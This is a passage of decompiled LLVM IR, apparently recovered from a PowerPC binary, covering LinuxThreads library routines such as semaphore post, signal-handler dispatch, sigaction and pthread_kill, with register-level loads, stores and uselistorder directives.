dec_label_pc_10008d04:                            ; preds = %dec_label_pc_10008cd8
  %v0_10008d04 = load i32, i32* @r31, align 4
  store i32 %v0_10008d04, i32* @r3, align 4
  store i32 268471564, i32* @lr, align 4
  %v1_10008d08 = call i32 @suspend.8(i32 %v0_10008d04)
  br label %dec_label_pc_10008d0c

dec_label_pc_10008d0c:                            ; preds = %dec_label_pc_10008cc4, %dec_label_pc_10008d04
  %v0_10008d0c = load i32, i32* @r31, align 4
  %v1_10008d0c = add i32 %v0_10008d0c, 442
  %v2_10008d0c = inttoptr i32 %v1_10008d0c to i8*
  %v3_10008d0c = load i8, i8* %v2_10008d0c, align 1
  %v3_10008d10 = icmp eq i8 %v3_10008d0c, 0
  br i1 %v3_10008d10, label %dec_label_pc_10008d18, label %dec_label_pc_10008d30

dec_label_pc_10008d18:                            ; preds = %dec_label_pc_10008d0c
  %v1_10008d18 = add i32 %v0_10008d0c, 440
  %v2_10008d18 = inttoptr i32 %v1_10008d18 to i8*
  %v3_10008d18 = load i8, i8* %v2_10008d18, align 1
  %v3_10008d1c = icmp eq i8 %v3_10008d18, 0
  br i1 %v3_10008d1c, label %dec_label_pc_10008cc4, label %dec_label_pc_10008d24

dec_label_pc_10008d24:                            ; preds = %dec_label_pc_10008d18
  %v1_10008d24 = add i32 %v0_10008d0c, 64
  %v2_10008d24 = inttoptr i32 %v1_10008d24 to i8*
  %v3_10008d24 = load i8, i8* %v2_10008d24, align 1
  %v3_10008d28 = icmp eq i8 %v3_10008d24, 0
  br i1 %v3_10008d28, label %dec_label_pc_10008d30, label %dec_label_pc_10008cc4

dec_label_pc_10008d30:                            ; preds = %dec_label_pc_10008d24, %dec_label_pc_10008d0c
  store i32 268471612, i32* @lr, align 4
  %v2_10008d38 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008d0c, i32 0)
  %v0_10008d3c = load i32, i32* @r31, align 4
  %v1_10008d3c = add i32 %v0_10008d3c, 440
  %v2_10008d3c = inttoptr i32 %v1_10008d3c to i8*
  %v3_10008d3c = load i8, i8* %v2_10008d3c, align 1
  %v3_10008d40 = icmp eq i8 %v3_10008d3c, 0
  br i1 %v3_10008d40, label %dec_label_pc_10008d84, label %dec_label_pc_10008d48

dec_label_pc_10008d48:                            ; preds = %dec_label_pc_10008d30
  %v1_10008d48 = add i32 %v0_10008d3c, 64
  %v2_10008d48 = inttoptr i32 %v1_10008d48 to i8*
  %v3_10008d48 = load i8, i8* %v2_10008d48, align 1
  %v3_10008d4c = icmp eq i8 %v3_10008d48, 0
  br i1 %v3_10008d4c, label %dec_label_pc_10008d54, label %dec_label_pc_10008d84

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008d48
  store i8 0, i8* %v2_10008d3c, align 1
  br label %dec_label_pc_10008d60

dec_label_pc_10008d60:                            ; preds = %dec_label_pc_10008cac, %dec_label_pc_10008d54
  %v0_10008d60 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10008d64

dec_label_pc_10008d64:                            ; preds = %dec_label_pc_10008cd8, %dec_label_pc_10008d60
  %v0_10008d64 = load i32, i32* @r31, align 4
  store i32 268471664, i32* @lr, align 4
  %v2_10008d6c = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008d64, i32 0)
  %v0_10008d70 = call i32 @__errno_location()
  br label %dec_label_pc_10008d7c

dec_label_pc_10008d7c:                            ; preds = %dec_label_pc_10008c34, %dec_label_pc_10008d64
  %storemerge2 = phi i32 [ %v0_10008c3c, %dec_label_pc_10008c34 ], [ %v0_10008d70, %dec_label_pc_10008d64 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_10008c34 ], [ 110, %dec_label_pc_10008d64 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10008d7c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_10008d7c, align 4
  %v0_10008d8c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008d88

dec_label_pc_10008d84:                            ; preds = %dec_label_pc_10008d48, %dec_label_pc_10008d30, %dec_label_pc_10008c0c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008d88

dec_label_pc_10008d88:                            ; preds = %dec_label_pc_10008d7c, %dec_label_pc_10008d84
  %v0_10008d8c = phi i32 [ %v0_10008d8c.pre, %dec_label_pc_10008d7c ], [ 0, %dec_label_pc_10008d84 ]
  ret i32 %v0_10008d8c

; uselistorder directives
  uselistorder i32 %v0_10008d0c, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 110, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_do_exit, { 9, 4, 11, 8, 0, 3, 7, 6, 1, 5, 2, 10 }
  uselistorder i32 440, { 0, 1, 2, 6, 5, 3, 4 }
  uselistorder i32 (i32)* @suspend.8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @enqueue.5, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.7, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008d88, { 1, 0 }
  uselistorder label %dec_label_pc_10008d7c, { 1, 0 }
  uselistorder label %dec_label_pc_10008d64, { 1, 0 }
  uselistorder label %dec_label_pc_10008d60, { 1, 0 }
  uselistorder label %dec_label_pc_10008d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10008c9c, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10008da8 = load i32, i32* @r2, align 4
  store i32 %v0_10008da8, i32* @r4, align 4
  %v1_10008db8 = add i32 %v0_10008da8, 84
  %v2_10008db8 = inttoptr i32 %v1_10008db8 to i32*
  %v3_10008db8 = load i32, i32* %v2_10008db8, align 4
  store i32 %v3_10008db8, i32* @r29, align 4
  %v3_10008dbc = icmp eq i32 %v3_10008db8, 0
  br i1 %v3_10008dbc, label %dec_label_pc_10008dc4, label %dec_label_pc_10008e40

dec_label_pc_10008dc4:                            ; preds = %entry
  store i32 268471752, i32* @lr, align 4
  %v0_10008dc4 = call i32 @__pthread_lock()
  %v0_10008dc8 = load i32, i32* @r30, align 4
  %v1_10008dc8 = add i32 %v0_10008dc8, 12
  %v2_10008dc8 = inttoptr i32 %v1_10008dc8 to i32*
  %v3_10008dc8 = load i32, i32* %v2_10008dc8, align 4
  store i32 %v3_10008dc8, i32* @r31, align 4
  %v3_10008dcc = icmp eq i32 %v3_10008dc8, 0
  br i1 %v3_10008dcc, label %dec_label_pc_10008dd4, label %dec_label_pc_10008e14

dec_label_pc_10008dd4:                            ; preds = %dec_label_pc_10008dc4
  %v1_10008dd4 = add i32 %v0_10008dc8, 8
  %v2_10008dd4 = inttoptr i32 %v1_10008dd4 to i32*
  %v3_10008dd4 = load i32, i32* %v2_10008dd4, align 4
  store i32 %v3_10008dd4, i32* %r9.global-to-local, align 4
  %v3_10008ddc = icmp eq i32 %v3_10008dd4, 2147483647
  br i1 %v3_10008ddc, label %dec_label_pc_10008de4, label %dec_label_pc_10008e00

dec_label_pc_10008de4:                            ; preds = %dec_label_pc_10008dd4
  %v0_10008de4 = call i32 @__errno_location()
  %v2_10008dec = inttoptr i32 %v0_10008de4 to i32*
  store i32 34, i32* %v2_10008dec, align 4
  %v0_10008df0 = load i32, i32* @r30, align 4
  store i32 %v0_10008df0, i32* @r3, align 4
  store i32 268471800, i32* @lr, align 4
  %v0_10008df4 = call i32 @__pthread_unlock()
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008eac

dec_label_pc_10008e00:                            ; preds = %dec_label_pc_10008dd4
  %v1_10008e00 = add i32 %v3_10008dd4, 1
  store i32 %v0_10008dc8, i32* @r3, align 4
  store i32 %v1_10008e00, i32* %v2_10008dd4, align 4
  store i32 ptrtoint (i32* @global_var_10008e10.333 to i32), i32* @lr, align 4
  %v0_10008e0c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10008ea8

dec_label_pc_10008e14:                            ; preds = %dec_label_pc_10008dc4
  %v1_10008e14 = add i32 %v3_10008dc8, 8
  %v2_10008e14 = inttoptr i32 %v1_10008e14 to i32*
  %v3_10008e14 = load i32, i32* %v2_10008e14, align 4
  store i32 %v0_10008dc8, i32* @r3, align 4
  store i32 %v3_10008e14, i32* %v2_10008dc8, align 4
  %v0_10008e20 = load i32, i32* @r29, align 4
  %v1_10008e20 = load i32, i32* @r31, align 4
  %v2_10008e20 = add i32 %v1_10008e20, 8
  %v3_10008e20 = inttoptr i32 %v2_10008e20 to i32*
  store i32 %v0_10008e20, i32* %v3_10008e20, align 4
  store i32 ptrtoint (i32* @global_var_10008e28.334 to i32), i32* @lr, align 4
  %v0_10008e24 = call i32 @__pthread_unlock()
  %v2_10008e2c = load i32, i32* @r31, align 4
  %v3_10008e2c = add i32 %v2_10008e2c, 442
  %v4_10008e2c = inttoptr i32 %v3_10008e2c to i8*
  store i8 1, i8* %v4_10008e2c, align 1
  %v0_10008e34 = load i32, i32* @r31, align 4
  store i32 %v0_10008e34, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10008e3c.335 to i32), i32* @lr, align 4
  %v0_10008e38 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_10008ea8

dec_label_pc_10008e40:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10008e44 = load i32, i32* @global_var_1002ef34.220, align 4
  %tmp7 = icmp sgt i32 %v3_10008e44, -1
  br i1 %tmp7, label %dec_label_pc_10008e70, label %dec_label_pc_10008e50

dec_label_pc_10008e50:                            ; preds = %dec_label_pc_10008e40
  store i32 268471892, i32* @lr, align 4
  %v2_10008e50 = call i32 @__pthread_initialize_manager(i32 %v0_10008da8)
  %tmp8 = icmp sgt i32 %v2_10008e50, -1
  br i1 %tmp8, label %dec_label_pc_10008e70, label %dec_label_pc_10008e5c

dec_label_pc_10008e5c:                            ; preds = %dec_label_pc_10008e50
  %v0_10008e5c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10008e68 = inttoptr i32 %v0_10008e5c to i32*
  store i32 11, i32* %v2_10008e68, align 4
  %v0_10008eb0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008eac

dec_label_pc_10008e70:                            ; preds = %dec_label_pc_10008e50, %dec_label_pc_10008e40
  %v2_10008e80 = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10008e7c

dec_label_pc_10008e7c:                            ; preds = %dec_label_pc_10008e98, %dec_label_pc_10008e70
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10008e84 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268471952, i32* @lr, align 4
  %v2_10008e8c = call i32 @__libc_write(i32 %v3_10008e84, i32 %v2_10008e80)
  %v3_10008e90 = icmp eq i32 %v2_10008e8c, -1
  br i1 %v3_10008e90, label %dec_label_pc_10008e98, label %dec_label_pc_10008ea8

dec_label_pc_10008e98:                            ; preds = %dec_label_pc_10008e7c
  %v0_10008e98 = call i32 @__errno_location()
  %v1_10008e9c = inttoptr i32 %v0_10008e98 to i32*
  %v2_10008e9c = load i32, i32* %v1_10008e9c, align 4
  %v3_10008ea0 = icmp eq i32 %v2_10008e9c, 4
  br i1 %v3_10008ea0, label %dec_label_pc_10008e7c, label %dec_label_pc_10008ea8

dec_label_pc_10008ea8:                            ; preds = %dec_label_pc_10008e7c, %dec_label_pc_10008e98, %dec_label_pc_10008e14, %dec_label_pc_10008e00
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008eac

dec_label_pc_10008eac:                            ; preds = %dec_label_pc_10008e5c, %dec_label_pc_10008de4, %dec_label_pc_10008ea8
  %v0_10008eb0 = phi i32 [ %v0_10008eb0.pre, %dec_label_pc_10008e5c ], [ -1, %dec_label_pc_10008de4 ], [ 0, %dec_label_pc_10008ea8 ]
  ret i32 %v0_10008eb0

; uselistorder directives
  uselistorder i32 %v3_10008dd4, { 1, 0, 2 }
  uselistorder i32 %v0_10008dc8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10008da8, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_10008eac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008ea8, { 1, 0, 2, 3 }
}

define i32 @pthread_sighandler_rt(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_10008ec4 = load i32, i32* @lr, align 4
  store i32 %v0_10008ec4, i32* %r0.global-to-local, align 4
  %v4_10008ec8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008ec8, i32* %stack_var_-32, align 4
  %v5_10008ec8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10008ecc = call i32 @__asm_mfcr()
  %v1_10008ed0 = mul i32 %v0_10008ecc, 4
  store i32 %v1_10008ed0, i32* %r11.global-to-local, align 4
  %v0_10008ed8 = load i32, i32* @r2, align 4
  store i32 %v0_10008ed8, i32* %r31.global-to-local, align 4
  %v0_10008edc = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ee4 = add i32 %v0_10008ed8, 88
  %v2_10008ee4 = inttoptr i32 %v1_10008ee4 to i8*
  %v3_10008ee4 = load i8, i8* %v2_10008ee4, align 1
  %v4_10008ee4 = zext i8 %v3_10008ee4 to i32
  store i32 %v4_10008ee4, i32* %r0.global-to-local, align 4
  %v3_10008ee8 = icmp eq i8 %v3_10008ee4, 0
  br i1 %v3_10008ee8, label %dec_label_pc_10008f00, label %dec_label_pc_10008ef0

dec_label_pc_10008ef0:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10008ef4 = add i32 %v0_10008ed8, 32
  %v3_10008ef4 = inttoptr i32 %v2_10008ef4 to i32*
  store i32 %v0_10008ecc, i32* %v3_10008ef4, align 4
  %v0_10008ef8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ef8 = trunc i32 %v0_10008ef8 to i8
  %v2_10008ef8 = load i32, i32* @r2, align 4
  %v3_10008ef8 = add i32 %v2_10008ef8, 88
  %v4_10008ef8 = inttoptr i32 %v3_10008ef8 to i8*
  store i8 %v1_10008ef8, i8* %v4_10008ef8, align 1
  br label %dec_label_pc_10008f2c

dec_label_pc_10008f00:                            ; preds = %entry
  %v1_10008f00 = add i32 %v0_10008ed8, 84
  %v2_10008f00 = inttoptr i32 %v1_10008f00 to i32*
  %v3_10008f00 = load i32, i32* %v2_10008f00, align 4
  store i32 %v3_10008f00, i32* %r30.global-to-local, align 4
  %v3_10008f04 = icmp eq i32 %v3_10008f00, 0
  store i1 %v3_10008f04, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10008f04, label %dec_label_pc_10008f0c, label %dec_label_pc_10008f10

dec_label_pc_10008f0c:                            ; preds = %dec_label_pc_10008f00
  store i32 %v5_10008ec8, i32* %v2_10008f00, align 4
  %v0_10008f18.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008f10

dec_label_pc_10008f10:                            ; preds = %dec_label_pc_10008f00, %dec_label_pc_10008f0c
  %v0_10008f18 = phi i32 [ %v1_10008ed0, %dec_label_pc_10008f00 ], [ %v0_10008f18.pre, %dec_label_pc_10008f0c ]
  %v2_10008f18 = add i32 %v0_10008f18, ptrtoint (i32* @global_var_1002f528.337 to i32)
  %v3_10008f18 = inttoptr i32 %v2_10008f18 to i32*
  %v4_10008f18 = load i32, i32* %v3_10008f18, align 4
  store i32 %v4_10008f18, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10008f18)
  %v0_10008f24 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10008f24, label %dec_label_pc_10008f28, label %dec_label_pc_10008f2c

dec_label_pc_10008f28:                            ; preds = %dec_label_pc_10008f10
  %v0_10008f28 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008f28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008f28 = add i32 %v1_10008f28, 84
  %v3_10008f28 = inttoptr i32 %v2_10008f28 to i32*
  store i32 %v0_10008f28, i32* %v3_10008f28, align 4
  br label %dec_label_pc_10008f2c

dec_label_pc_10008f2c:                            ; preds = %dec_label_pc_10008f10, %dec_label_pc_10008ef0, %dec_label_pc_10008f28
  store i32 %v0_10008edc, i32* %r0.global-to-local, align 4
  %v1_10008f3c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10008ecc)
  ret i32 %v0_10008ecc

; uselistorder directives
  uselistorder i32 %v1_10008ed0, { 1, 0 }
  uselistorder i32 %v0_10008ecc, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10008f2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008f10, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_10008f48 = load i32, i32* @r3, align 4
  ret i32 %v0_10008f48
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v3_10008f6c = load i32, i32* @global_var_1002ef54.217, align 4
  %v4_10008f70 = icmp eq i32 %v3_10008f6c, %arg1
  br i1 %v4_10008f70, label %dec_label_pc_10009074, label %dec_label_pc_10008f78

dec_label_pc_10008f78:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10008f7c = load i32, i32* @global_var_1002ef58.229, align 4
  %v4_10008f80 = icmp eq i32 %v3_10008f7c, %arg1
  br i1 %v4_10008f80, label %dec_label_pc_10009074, label %dec_label_pc_10008f88

dec_label_pc_10008f88:                            ; preds = %dec_label_pc_10008f78
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10008f8c = load i32, i32* @global_var_1002ef5c.230, align 4
  %v4_10008f90 = icmp eq i32 %v3_10008f8c, %arg1
  br i1 %v4_10008f90, label %dec_label_pc_10008f98, label %dec_label_pc_10008fa0

dec_label_pc_10008f98:                            ; preds = %dec_label_pc_10008f88
  %v2_10008f98 = icmp sgt i32 %arg1, 0
  br i1 %v2_10008f98, label %dec_label_pc_10009074, label %dec_label_pc_10008fa0

dec_label_pc_10008fa0:                            ; preds = %dec_label_pc_10008f88, %dec_label_pc_10008f98
  %v3_10008fa0 = icmp eq i32* %arg2, null
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10008fa0, label %dec_label_pc_1000900c, label %dec_label_pc_10008fac

dec_label_pc_10008fac:                            ; preds = %dec_label_pc_10008fa0
  %v2_10008fac = ptrtoint i32* %stack_var_-168 to i32
  store i32 140, i32* @r5, align 4
  store i32 %v2_10008fac, i32* @r3, align 4
  store i32 268472252, i32* @lr, align 4
  %v0_10008fb8 = call i32 @memcpy()
  store i32 %v0_10008fb8, i32* %r3.global-to-local, align 4
  %v0_10008fbc = load i32, i32* @r30, align 4
  %v1_10008fbc = inttoptr i32 %v0_10008fbc to i32*
  %v2_10008fbc = load i32, i32* %v1_10008fbc, align 4
  %tmp10 = or i32 %v2_10008fbc, 1
  %tmp11 = icmp eq i32 %tmp10, 1
  %v0_10009014.pre.pre = load i32, i32* @r31, align 4
  br i1 %tmp11, label %dec_label_pc_10009008, label %dec_label_pc_10008fc8

dec_label_pc_10008fc8:                            ; preds = %dec_label_pc_10008fac
  %tmp12 = icmp slt i32 %v0_10009014.pre.pre, 1
  br i1 %tmp12, label %dec_label_pc_10009008, label %dec_label_pc_10008fd0

dec_label_pc_10008fd0:                            ; preds = %dec_label_pc_10008fc8
  %v2_10008fd0 = icmp sgt i32 %v0_10009014.pre.pre, 64
  br i1 %v2_10008fd0, label %dec_label_pc_10009008, label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fd0
  %v1_10008fd8 = add i32 %v0_10008fbc, 132
  %v2_10008fd8 = inttoptr i32 %v1_10008fd8 to i32*
  %v3_10008fd8 = load i32, i32* %v2_10008fd8, align 4
  %v1_10008fdc = and i32 %v3_10008fd8, 4
  %v3_10008fdc = icmp eq i32 %v1_10008fdc, 0
  %. = select i1 %v3_10008fdc, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -28080), i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -28988)
  store i32 %v2_10008fac, i32* %r3.global-to-local, align 4
  store i32 %., i32* %stack_var_-168, align 4
  br label %dec_label_pc_1000900c

dec_label_pc_10009008:                            ; preds = %dec_label_pc_10008fac, %dec_label_pc_10008fd0, %dec_label_pc_10008fc8
  store i32 %v2_10008fac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000900c

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10008fa0, %dec_label_pc_10008fd8, %dec_label_pc_10009008
  %v0_10009014 = phi i32 [ %arg1, %dec_label_pc_10008fa0 ], [ %v0_10009014.pre.pre, %dec_label_pc_10008fd8 ], [ %v0_10009014.pre.pre, %dec_label_pc_10009008 ]
  %v0_1000900c = phi i32 [ 0, %dec_label_pc_10008fa0 ], [ %v2_10008fac, %dec_label_pc_10008fd8 ], [ %v2_10008fac, %dec_label_pc_10009008 ]
  %v0_10009010 = load i32, i32* @r28, align 4
  store i32 %v0_10009014, i32* %r3.global-to-local, align 4
  store i32 268472348, i32* @lr, align 4
  %v3_10009018 = inttoptr i32 %v0_1000900c to i32*
  %v4_10009018 = call i32 @__libc_sigaction(i32 %v0_10009014, i32* %v3_10009018, i32 %v0_10009010)
  %v3_1000901c = icmp eq i32 %v4_10009018, -1
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v3_1000901c, label %dec_label_pc_10009080, label %dec_label_pc_10009028

dec_label_pc_10009028:                            ; preds = %dec_label_pc_1000900c
  %v0_10009028 = load i32, i32* @r31, align 4
  %v1_10009028 = add i32 %v0_10009028, -1
  %v2_1000902c = icmp ugt i32 %v1_10009028, 63
  br i1 %v2_1000902c, label %dec_label_pc_1000907c, label %dec_label_pc_10009034

dec_label_pc_10009034:                            ; preds = %dec_label_pc_10009028
  %v0_10009034 = load i32, i32* @r28, align 4
  %v3_10009034 = icmp eq i32 %v0_10009034, 0
  br i1 %v3_10009034, label %dec_label_pc_10009050, label %dec_label_pc_1000903c

dec_label_pc_1000903c:                            ; preds = %dec_label_pc_10009034
  %v1_10009040 = mul i32 %v0_10009028, 4
  store i32 ptrtoint (i32* @global_var_1002f528.337 to i32), i32* @r9, align 4
  %v2_10009048 = add i32 %v1_10009040, ptrtoint (i32* @global_var_1002f528.337 to i32)
  %v3_10009048 = inttoptr i32 %v2_10009048 to i32*
  %v4_10009048 = load i32, i32* %v3_10009048, align 4
  %v2_1000904c = inttoptr i32 %v0_10009034 to i32*
  store i32 %v4_10009048, i32* %v2_1000904c, align 4
  br label %dec_label_pc_10009050

dec_label_pc_10009050:                            ; preds = %dec_label_pc_10009034, %dec_label_pc_1000903c
  %v0_10009050 = load i32, i32* @r30, align 4
  %v3_10009050 = icmp eq i32 %v0_10009050, 0
  br i1 %v3_10009050, label %dec_label_pc_1000907c, label %dec_label_pc_10009058

dec_label_pc_10009058:                            ; preds = %dec_label_pc_10009050
  %v1_10009058 = inttoptr i32 %v0_10009050 to i32*
  %v2_10009058 = load i32, i32* %v1_10009058, align 4
  store i32 %v2_10009058, i32* @r11, align 4
  %v0_10009060 = load i32, i32* @r31, align 4
  %v1_10009060 = mul i32 %v0_10009060, 4
  store i32 ptrtoint (i32* @global_var_1002f528.337 to i32), i32* @r9, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1000906c = add i32 %v1_10009060, ptrtoint (i32* @global_var_1002f528.337 to i32)
  %v4_1000906c = inttoptr i32 %v3_1000906c to i32*
  store i32 %v2_10009058, i32* %v4_1000906c, align 4
  %v0_10009090.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009080

dec_label_pc_10009074:                            ; preds = %dec_label_pc_10008f98, %dec_label_pc_10008f78, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009080

dec_label_pc_1000907c:                            ; preds = %dec_label_pc_10009050, %dec_label_pc_10009028
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009080

dec_label_pc_10009080:                            ; preds = %dec_label_pc_1000900c, %dec_label_pc_10009074, %dec_label_pc_10009058, %dec_label_pc_1000907c
  %v0_10009090 = phi i32 [ -1, %dec_label_pc_1000900c ], [ 22, %dec_label_pc_10009074 ], [ %v0_10009090.pre, %dec_label_pc_10009058 ], [ 0, %dec_label_pc_1000907c ]
  ret i32 %v0_10009090

; uselistorder directives
  uselistorder i32 %v0_10009014, { 1, 0 }
  uselistorder i32 %v0_10009014.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10008fac, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder label %dec_label_pc_10009080, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10009050, { 1, 0 }
  uselistorder label %dec_label_pc_1000900c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009008, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008fa0, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_100090ac = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_100090b0 = add i32 %v1_100090ac, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %v2_100090b0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268472520, i32* @lr, align 4
  %v0_100090c4 = call i32 @__pthread_lock()
  %v0_100090c8 = load i32, i32* @r31, align 4
  %v1_100090c8 = add i32 %v0_100090c8, 8
  %v2_100090c8 = inttoptr i32 %v1_100090c8 to i32*
  %v3_100090c8 = load i32, i32* %v2_100090c8, align 4
  store i32 %v0_100090c8, i32* @r3, align 4
  %v3_100090d0 = icmp eq i32 %v3_100090c8, 0
  br i1 %v3_100090d0, label %dec_label_pc_100090e4, label %dec_label_pc_100090d8

dec_label_pc_100090d8:                            ; preds = %entry
  %v1_100090d8 = add i32 %v3_100090c8, 16
  %v2_100090d8 = inttoptr i32 %v1_100090d8 to i32*
  %v3_100090d8 = load i32, i32* %v2_100090d8, align 4
  %v0_100090dc = load i32, i32* @r29, align 4
  %v4_100090dc = icmp eq i32 %v0_100090dc, %v3_100090d8
  br i1 %v4_100090dc, label %dec_label_pc_100090f0, label %dec_label_pc_100090e4

dec_label_pc_100090e4:                            ; preds = %dec_label_pc_100090d8, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100090e8.338 to i32), i32* @lr, align 4
  %v0_100090e4 = call i32 @__pthread_unlock()
  br label %dec_label_pc_1000911c

dec_label_pc_100090f0:                            ; preds = %dec_label_pc_100090d8
  %v1_100090f0 = add i32 %v3_100090c8, 20
  %v2_100090f0 = inttoptr i32 %v1_100090f0 to i32*
  %v3_100090f0 = load i32, i32* %v2_100090f0, align 4
  store i32 %v0_100090c8, i32* @r3, align 4
  store i32 268472572, i32* @lr, align 4
  %v0_100090f8 = call i32 @__pthread_unlock()
  %v0_100090fc = load i32, i32* @r30, align 4
  store i32 268472584, i32* @lr, align 4
  %v2_10009104 = call i32 @kill(i32 %v3_100090f0, i32 %v0_100090fc)
  %v3_10009108 = icmp eq i32 %v2_10009104, -1
  br i1 %v3_10009108, label %dec_label_pc_10009114, label %dec_label_pc_1000911c

dec_label_pc_10009114:                            ; preds = %dec_label_pc_100090f0
  %v0_10009114 = call i32 @__errno_location()
  %v1_10009118 = inttoptr i32 %v0_10009114 to i32*
  %v2_10009118 = load i32, i32* %v1_10009118, align 4
  br label %dec_label_pc_1000911c

dec_label_pc_1000911c:                            ; preds = %dec_label_pc_100090f0, %dec_label_pc_100090e4, %dec_label_pc_10009114
  %v0_1000912c = phi i32 [ 0, %dec_label_pc_100090f0 ], [ 3, %dec_label_pc_100090e4 ], [ %v2_10009118, %dec_label_pc_10009114 ]
  ret i32 %v0_1000912c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 4, 3, 0, 2 }
